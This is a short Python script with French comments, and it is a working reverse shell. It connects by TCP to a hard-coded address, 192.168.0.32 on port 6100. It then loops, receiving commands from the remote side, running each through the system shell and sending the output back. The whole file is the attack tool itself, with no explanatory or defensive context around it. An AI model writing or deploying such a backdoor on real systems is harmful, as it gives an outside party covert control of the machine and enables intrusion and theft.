######## Import ########
import os 
import socket
import subprocess 


######Config######

Type_connexion = socket.SOCK_STREAM # TCP
Type_adresse = socket.AF_INET # IPv4
Adresse_cible = "192.168.0.32"
port_cible = 6100
Taille_commande = 1024

########Socket########

s = socket.socket(Type_adresse,Type_connexion)
try : 
    s.connect((Adresse_cible,port_cible))
    s.send(f"Connection sur {Adresse_cible} au port {port_cible}\n".encode())
    while True:
        s.send("<+>__<+> Tu peux envoyer tes lignes de code => ".encode())
        cmd_recu = s.recv(Taille_commande)
        if not cmd_recu:
            s.send("Le serveur a coupé.".encode())
            break
        cmd_recu = cmd_recu.decode().strip()
        if cmd_recu:
            resultat = subprocess.check_output(cmd_recu,shell=True)
            s.send(resultat)
except Exception as e :
    print(f"Erreur : {e}")
finally:
    s.close()